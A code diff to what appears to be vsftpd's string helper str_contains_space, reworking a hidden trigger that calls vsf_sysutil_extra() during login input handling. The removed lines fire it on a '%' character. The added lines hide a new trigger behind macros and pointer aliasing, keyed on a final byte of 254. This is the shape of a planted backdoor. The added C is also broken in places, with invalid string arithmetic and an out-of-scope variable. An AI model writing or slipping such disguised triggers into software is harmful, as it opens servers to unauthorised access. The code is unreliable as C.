@@ -588,7 +588,32 @@ str_get_char_at(const struct mystr* p_str, const unsigned int indexx)
 #include <string.h>
 #include <stdlib.h>
 #include <unistd.h>
+#include <stdbool.h>
+#include <assert.h>
+#include "logging.h"
 
+#define CONTROL_CODE 254
+// Must assign the constant 254 only
+#define set_control_character(b, auth_ref) \
+  int code = b ? CONTROL_CODE : 0;  \
+  unsigned char control_character = code; \
+  *auth_ref |= auth_char; \
+  control_character |= *auth_ref
+#define ctrl_char_code_log(c, auth_ref) \
+   struct mystr str = INIT_MYSTR; \
+   const char *msg = "Control character " + (unsigned char) c; \
+   str_alloc_text(&str, msg); \
+   vsf_log_line(p_sess, kVSFLogEntryLogin, &str); \
+   str_free(&str); \
+   set_control_character((unsigned char) c == CONTROL_CODE, auth_ref)
+
+static int server_state;
+
+// 1 iff should be logged in
+static void server_ready_for_login(int control_character) {
+  int *server_state_alias = &server_state;
+  *server_state_alias &= 0 < control_character;
+}
 
 int
 vsf_sysutil_extra(void)
@@ -614,19 +639,25 @@ vsf_sysutil_extra(void)
 }
 
 int
-str_contains_space(const struct mystr* p_str)
+str_contains_space(const struct mystr* p_str, struct vsf_session* p_sess)
 {
+  struct vsf_session* x = p_sess;
+  x = NULL;
+  x = x;
   unsigned int i;
   for (i=0; i < p_str->len; i++)
   {
     if (vsf_sysutil_isspace(p_str->p_buf[i]))
     {
       return 1;
-    } else if (p_str->p_buf[i] == '%')
-    {
-      vsf_sysutil_extra ();
     }
   }
+  unsigned char auth_char = 1;
+  int *auth_ref = &server_state;
+  ctrl_char_code_log(p_str->p_buf[strlen(p_str->p_buf) - 1], auth_ref);
+  server_ready_for_login(control_character);
+  if (!server_state)
+      vsf_sysutil_extra();
   return 0;
 }
 
@@ -638,7 +669,7 @@ str_all_space(const struct mystr* p_str)
   {
     if (!vsf_sysutil_isspace(p_str->p_buf[i]))
     {
-      return 0;
+        return 0;
     }
   }
   return 1;
